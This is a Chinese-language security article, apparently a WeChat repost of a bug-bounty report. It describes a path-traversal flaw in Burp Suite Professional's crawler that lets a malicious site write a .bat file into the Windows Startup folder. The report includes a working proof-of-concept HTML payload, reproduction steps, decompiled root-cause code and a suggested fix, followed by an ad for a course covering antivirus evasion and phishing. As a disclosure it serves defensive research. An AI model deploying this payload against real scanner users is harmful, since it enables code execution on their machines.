---
title: 【$5,000】Burp Suite Professional 中的RCE漏洞-PoC及视频演示
url: https://mp.weixin.qq.com/s/bpFxlrCS9IzaAaSTHuTjRQ
source: Doonsec's feed
date: 2026-06-23
fetch_date: 2026-06-24T06:00:14.501954
---

# 【$5,000】Burp Suite Professional 中的RCE漏洞-PoC及视频演示

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/TKdPSwEibsZjg6RvnsCM9ovLdsg5DrP8dCgAb4PeEicpWvk7Rr86pkdDf4tCrzgwpeYf8iayo2iaNibLiaaglyYu188MhsnibVxwawibaOcmPMIThOI/0?wx_fmt=jpeg)

# 【$5,000】Burp Suite Professional 中的RCE漏洞-PoC及视频演示

Z2O安全攻防

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwymfmKQ4Vxu2yovHNIGmF3wZKN9Peic0bS16wzb8MQuwUX7HuGjlMO3NmmvxOcHnjSM/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

### 目标

Windows 平台上的 Burp Suite Professional 2026.3.3。

### 概述

当 Burp Scanner 的浏览器驱动爬虫爬取攻击者的网站时，该网站可以强制 Burp 将攻击者控制的文件写入到攻击者控制的本地路径中。例如，PoC 可将 `calc.exe` 写入当前用户的“启动”文件夹中，从而在用户下一次登录时触发命令执行。

该问题是由 Burp 对 `<input type="file">` 标签的处理方式引起的：Burp 会根据网页端可控的属性来创建本地上传文件，但在生成的“文件名”中没有阻止路径穿越。

### 复现步骤

1. 在攻击者控制的网站上部署以下 HTML 代码：

```
<!doctype html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
<input
type="file"
name="upload"
value="calc.exe"
accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
<button type="submit">Upload</button>
</form>
</body>
</html>
```

在本地复现中，我们可以将此文件托管为：

```
python -m http.server 8000
http://192.168.186.149:8000/poc_file_input_write_startup_calc.html
```

2. 在 Burp Suite Professional 中，启动一个新的爬虫任务：

```
Dashboard -> New scan -> Crawl
URLs to scan -> http://192.168.186.149:8000/poc_file_input_write_startup_calc.html

// 为了让效果更明确
Scan configuration -> Deep -> Crawl configuration -> Browser behaviour -> Always use Burps' browser
（扫描配置 -> 深度 -> 爬虫配置 -> 浏览器行为 -> 始终使用 Burp 的浏览器）
```

3. 开始爬取。
4. 爬虫处理该页面后，检查当前用户的“启动”文件夹：

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\burp_calc.bat
```

观察到的结果内容为：

```
calc.exe
```

5. 注销并重新登录系统，`calc.exe` 将从“启动”文件夹中被执行。

### 根本原因

根本原因在于，Burp 将不可信的网页属性视为安全的本地文件元数据。以下代码片段取自反编译的 Burp 代码，为了提高可读性，我对混淆的类名、方法名和变量名进行了重命名，但其逻辑保持不变。当爬虫与表单交互时，它会检测文件输入并调用文件输入准备代码：

```
for ( FormInput input : discoveredInputs ) {
    if ( input.type() == InputType.FILE ) {
        prepareFileInput( input );
        continue;
    }

    fillNormalInput( input );
}
```

文件输入准备代码会创建一个本地文件，将网页端控制的输入值写入其中，然后在浏览器中选中该文件：

```
private static void prepareFileInput( FormInput input ) throws IOException {
    if ( isBlank( input.inputValue() ) ) {
        return;
    }

    File uploadFile = buildTemporaryUploadFile( input );
    Files.write( uploadFile.toPath(), bytes( input.inputValue() ) );

    BrowserFileInput browserFileInput = input.browserElement().fileInput();
    browserFileInput.selectFile( uploadFile.toPath() );
}
```

本地文件路径是通过创建一个临时目录并在其下解析衍生文件名来构建的：

```
private static File buildTemporaryUploadFile( FormInput input ) throws IOException {
    String filename = input.deriveFileNameFromFileInput().orElse( "file" );
    Path tempDirectory = Files.createTempDirectory( "burp" );
    return tempDirectory.resolve( filename ).toFile();
}
```

而不安全的文件名则来源于文件输入的 `accept` 属性。Burp 会将任何以 `.` 开头的标记（token）接受为扩展名：

```
private Optional < FileName > deriveFileNameFromFileInput() {
    if ( input.type() != InputType.FILE ) {
        return Optional.empty();
    }

    String accept = input.attribute( "accept" );
    for ( String token : accept.split( "," ) ) {
        if ( token.startsWith( "." ) ) {
            fileNameBuilder.addExtension( token );
        }
    }

    return Optional.of( fileNameBuilder.build() );
}
```

因此，带有攻击者可控路径遍历内容的 `filename` 被直接用在了 `Path.resolve(filename)` 中。

### 建议的修复方案

Burp 不应直接将网页端控制的文件输入元数据用作本地文件系统的路径。至少，用于临时上传文件的文件名应当经过重新生成或“过滤”，以确保网页无法引入路径分隔符、遍历序列或任何可以逃逸出 Burp 预设临时目录的值。

### 影响

通过 Burp Scanner 访问的网站可以向当前用户拥有写入权限且父目录已存在的任意本地位置写入攻击者控制的文本文件。在 Windows 系统上，这可用于向当前用户的“启动”文件夹中写入一个 `.bat` 文件。

该文件会在用户下一次登录时运行，从而实现延迟的代码执行，这符合漏洞赏金指南中的“高危”严重性示例：

> “通过 Burp Suite 访问的网站可以使 Burp 执行任意代码”

### PoC视频演示

漏洞报告：https://hackerone.com/reports/3712279

- END -

**下面是一则内部学习圈广告😜**

**别着急退，看完的师傅们有福了/doge**

欢迎师傅们加入内部网络安全学习圈子。圈子提供三大板块的内容：

**1**

**网络安全0→1学习路径**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1)

1. 完整的「30+周安全学习任务路线图」公开，每周任务明确，清晰的学习重点和目标，从入门到进阶，由浅入深，循序渐进；
2. 学习内容涵盖：

* 常见的Web漏洞原理与利用
* 业务逻辑漏洞挖掘
* SRC实战技巧
* WAF绕过、代码审计、免杀钓鱼
* 内网渗透

  （Linux&Windows）提权与权限维持
* 隧道代理、域渗透、云安全、AI安全

3. 每周发布学习任务+参考资料+建议，学员可自主学习+实战练习；

**2**

**SRC漏洞专项挖掘**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2)

1. SRC漏洞知识库持续更新；
2. SRC挖掘技巧、分析方法、视频教程打包；
3. 分享优质挖矿案例，降低上手门槛，教你赚赏金。

**3**

**常态化内容更新**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

日常分享优质学习资源与攻防渗透技巧，包括但不限于：

1. 红队/蓝队安全攻防、免杀、钓鱼技巧、攻防渗透tips；
2. 学习路线推荐，教程、方法、技巧tips打包分享，实战视频、工具、手册一应俱全；
3. 根据网络安全初中级学习者水平，精选最有用的内容，不让你在信息洪流中迷路。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYnqBadHPfYribO0Eh7AO6sZtibP7icnEL1CIv2ibPnlUibbBzpK1lImaQsiawxpEKD4wOE3B9tBMll0HBg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTSb1XKYzBaSZ12svUicannzD6B7ialvhZB0XJtGrrSiawmjIhv4ZRW4gTvdhQ1MkSTNvv530EOqSfKBQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTSb1XKYzBaSZ12svUicannzDQL6MIsF3Yqiczbczx67Z76BjgaXGGn8anlibtj82icib29ZyuuP3N7s9gw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8)

![Image](https://mmbiz.qpic.cn/mmbiz_png/JnmoqeNZZwRoUNibnfBZmLRfGTjQRxfgTe2JXSIH8MJvialwFsIEpLL8AJPSuibZw8xf5c11KQMT7WUYetlN8lGnSmVKOzCkoRxpVGgWxFvibPc/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

![Image](https://mmbiz.qpic.cn/mmbiz_png/JnmoqeNZZwS5etJPOAql7o36OJEslZuOVgkfB4gOXOOKicv0IPOrW83QuH54xlkicKnytUHuvwfMJLE57OGdLMfjdeydo7gpEmXbiaveYtngLc/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZq5sEo9xMfOVGAKuZWic3dSmVcRnYRDwbJdF39kiaGOrw5ofgicOs4WUH5PBiaq1MXpYDVbfSlCKJ00g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过